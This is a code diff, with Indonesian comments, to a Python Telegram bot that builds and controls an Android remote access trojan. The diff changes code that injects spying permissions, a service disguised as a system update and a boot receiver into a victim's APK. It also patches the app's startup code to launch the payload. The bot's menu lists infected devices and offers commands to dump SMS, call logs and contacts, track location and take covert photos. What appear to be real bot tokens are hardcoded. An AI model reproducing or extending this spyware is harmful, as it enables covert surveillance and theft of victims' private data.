@@ -13,7 +13,7 @@ from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandle
 # ── KONFIGURASI ──
 TOKEN = "9067923295:AAE-sOBegpDh0IgaLKpn32-Nlmv9ibGYgwo" 
 PAYLOAD_BOT_TOKEN = "8887819326:AAFX97DDbezzF_y-kOQWBL02NNy38nWxAIY"
-PAYLOAD_BOT_USERNAME = "Hasil_rat_bot" # GANTI INI
+PAYLOAD_BOT_USERNAME = "IsiUsernameBotPayloadKamu" # GANTI INI
 
 ALLOWED_CHAT_ID = "8598136412" 
 
@@ -32,17 +32,13 @@ def is_authorized(update: Update):
     return str(update.effective_chat.id) == ALLOWED_CHAT_ID
 
 def load_devices():
-    if not os.path.exists(DEVICES_FILE):
-        return []
+    if not os.path.exists(DEVICES_FILE): return []
     try:
-        with open(DEVICES_FILE, "r") as f:
-            return json.load(f)
-    except:
-        return []
+        with open(DEVICES_FILE, "r") as f: return json.load(f)
+    except: return []
 
 def save_devices(devices):
-    with open(DEVICES_FILE, "w") as f:
-        json.dump(devices, f)
+    with open(DEVICES_FILE, "w") as f: json.dump(devices, f)
 
 def ensure_keystore():
     if not os.path.exists(KEYSTORE_PATH):
@@ -61,7 +57,8 @@ def inject_manifest(manifest_path):
                    "android.permission.READ_CONTACTS", "android.permission.READ_CALL_LOG", "android.permission.CAMERA", 
                    "android.permission.READ_EXTERNAL_STORAGE", "android.permission.WRITE_EXTERNAL_STORAGE", 
                    "android.permission.ACCESS_FINE_LOCATION", "android.permission.RECEIVE_BOOT_COMPLETED", 
-                   "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"]
+                   "android.permission.FOREGROUND_SERVICE", "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+                   "android.permission.POST_NOTIFICATIONS"] # Buat Android 13+
                    
     for perm in permissions:
         if not any(p.get(ns + 'name') == perm for p in root.findall('uses-permission')):
@@ -69,8 +66,9 @@ def inject_manifest(manifest_path):
 
     app = root.find('application')
     if app is not None:
+        # Nambahin foregroundServiceType="dataSync"
         if not any(s.get(ns + 'name') == 'com.system.update.Payload' for s in app.findall('service')):
-            ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false'})
+            ET.SubElement(app, 'service', {ns + 'name': 'com.system.update.Payload', ns + 'enabled': 'true', ns + 'exported': 'false', ns + 'foregroundServiceType': 'dataSync'})
             
         if not any(r.get(ns + 'name') == 'com.system.update.BootReceiver' for r in app.findall('receiver')):
             receiver = ET.SubElement(app, 'receiver', {ns + 'name': 'com.system.update.BootReceiver', ns + 'enabled': 'true', ns + 'exported': 'true'})
@@ -114,15 +112,24 @@ def inject_permission_popup(apk_out_dir):
                 if ".locals" in lines[j] or ".registers" in lines[j]:
                     parts = lines[j].split()
                     if len(parts) >= 2:
-                        if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 3}\n"
-                        else: lines[j] = f"    .registers {int(parts[1]) + 3}\n"
+                        # Tambah 5 register buat Toast & Intent
+                        if ".locals" in lines[j]: lines[j] = f"    .locals {int(parts[1]) + 5}\n"
+                        else: lines[j] = f"    .registers {int(parts[1]) + 5}\n"
                         
+                        # KODE SUNTIKAN BARU (Ada Toast & StartService)
                         inject_code = (
-                            "\n    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
+                            "\n    # Tampilkan Toast 'Injection Active'\n"
+                            "    const-string v2, \"Injection Active\"\n"
+                            "    const/4 v3, 0x1\n"
+                            "    invoke-static {p0, v2, v3}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;\n"
+                            "    move-result-object v2\n"
+                            "    invoke-virtual {v2}, Landroid/widget/Toast;->show()V\n\n"
+                            "    # Minta Izin & Start Service\n"
+                            "    invoke-static {p0}, Lcom/system/update/Payload;->askPermissions(Landroid/app/Activity;)V\n\n"
                             "    new-instance v0, Landroid/content/Intent;\n"
                             "    const-class v1, Lcom/system/update/Payload;\n"
                             "    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V\n"
-                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
+                            "    invoke-virtual {p0, v0}, Landroid/content/Context;->startForegroundService(Landroid/content/Intent;)Landroid/content/ComponentName;\n"
                         )
                         lines.insert(j + 1, inject_code)
                         injected = True
@@ -131,7 +138,7 @@ def inject_permission_popup(apk_out_dir):
 
     if injected:
         with open(smali_path, "w", encoding="utf-8") as f: f.writelines(lines)
-        return "✅ Pop-up & StartService disuntikkan."
+        return "✅ Pop-up, Toast & StartService disuntikkan."
     else: return "⚠️ Gagal nyuntik onCreate."
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -156,10 +163,9 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif query.data == "menu_device":
         devices = load_devices()
         if not devices:
-            await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nBelum ada device yang masuk.\n*(Install APK-nya di HP target, buka aplikasinya, dan pastikan internetnya nyala).*", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]), parse_mode='Markdown')
+            await query.edit_message_text("📱 **List Device Ter-Sadap**\n\nBelum ada device yang masuk.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")]]), parse_mode='Markdown')
         else:
             keyboard = []
-            # Tampilin max 5 device
             for idx, dev in enumerate(devices[:5]):
                 keyboard.append([InlineKeyboardButton(f"📱 {dev}", callback_data=f"device_{idx}")])
             keyboard.append([InlineKeyboardButton("⬅️ Kembali", callback_data="back_start")])
@@ -181,8 +187,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await start(update, context)
         except Exception as e: await query.message.reply_text(f"❌ Gagal Backup: {e}"); await start(update, context)
         
-    elif query.data == "back_start": 
-        await start(update, context)
+    elif query.data == "back_start": await start(update, context)
         
     elif query.data.startswith("device_"):
         keyboard = [[InlineKeyboardButton("📂 Cek File", callback_data="cmd_cek_file"), InlineKeyboardButton("📩 Dump SMS", callback_data="cmd_dump_sms")],[InlineKeyboardButton("📞 Dump Telpon", callback_data="cmd_dump_telpon"), InlineKeyboardButton("👥 Dump Kontak", callback_data="cmd_dump_kontak")],[InlineKeyboardButton("📍 Lokasi", callback_data="cmd_lacak"), InlineKeyboardButton("📸 Foto Depan", callback_data="cmd_foto_depan")],[InlineKeyboardButton("📷 Foto Belakang", callback_data="cmd_foto_belakang")],[InlineKeyboardButton("⬅️ Kembali", callback_data="menu_device")]]
@@ -192,25 +197,14 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         perintah = "/" + query.data.replace("cmd_", "")
         url_payload = f"https://t.me/{PAYLOAD_BOT_USERNAME}"
         keyboard = [[InlineKeyboardButton("🚀 Buka Bot Payload & Kirim Perintah", url=url_payload)]]
-        
-        await query.message.reply_text(
-            f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\n"
-            f"Silakan klik tombol di bawah untuk buka **Bot Payload**, lalu **COPY & KIRIM** teks ini di sana:\n\n"
-            f"`{perintah}`\n\n"
-            f"*(Pastikan nggak ada typo).*",
-            reply_markup=InlineKeyboardMarkup(keyboard),
-            parse_mode='Markdown'
-        )
+        await query.message.reply_text(f"⚠️ **JANGAN KETIK DI CHAT INI!**\n\nBuka **Bot Payload**, lalu **KIRIM** teks ini:\n\n`{perintah}`", reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
 
-# Handler buat nangkep pesan /checkin dari APK korban
 async def handle_checkin(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_authorized(update): return
-    
     text = update.message.text
     if text.startswith("/checkin "):
         device_info = text.replace("/checkin ", "").strip()
         devices = load_devices()
-        
         if device_info not in devices:
             devices.append(device_info)
             save_devices(devices)
